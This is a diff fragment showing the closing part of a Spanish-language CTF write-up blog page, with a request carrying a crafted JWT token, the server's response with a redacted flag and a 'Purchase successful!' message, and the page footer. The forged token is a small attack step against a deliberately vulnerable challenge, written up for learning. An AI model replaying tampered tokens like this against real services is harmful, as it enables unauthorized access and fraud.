+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>token<span style="color:#f92672">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYUBhLmEiLCJxdWV1ZV90aW1lIjowLjEsImV4cCI6NTM0ODAzNjQ5MH0.A-KeWH05z3ZmQo22_XbzB67LV7ITw_hrAPlFxunQ3aU
+</span></span></code></pre></div><p><strong>Respuesta:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Server: Werkzeug/3.1.3 Python/3.9.22
+</span></span><span style="display:flex;"><span>Date: Fri, <span style="color:#ae81ff">23</span> May <span style="color:#ae81ff">2025</span> 23:00:14 GMT
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">98</span>
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;flag&#34;</span>:<span style="color:#e6db74">&#34;flag{&lt;--REDACTED--&gt;}&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Purchase successful!&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;success&#34;</span>:true
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>De esta forma, hemos conseguido la bandera para este reto.</p>
+<h2 id="referencias-útiles">Referencias útiles<a href="#referencias-útiles" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li><a href="https://jwt.io/">jwt.io</a></li>
+</ul>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Más posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+    
+    
+      <a href="https://albertnath.github.io/hfc-blog/posts/shell_shop/" class="button inline next">
+         [<span class="button__text">shell_shop</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="https://albertnath.github.io/hfc-blog/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
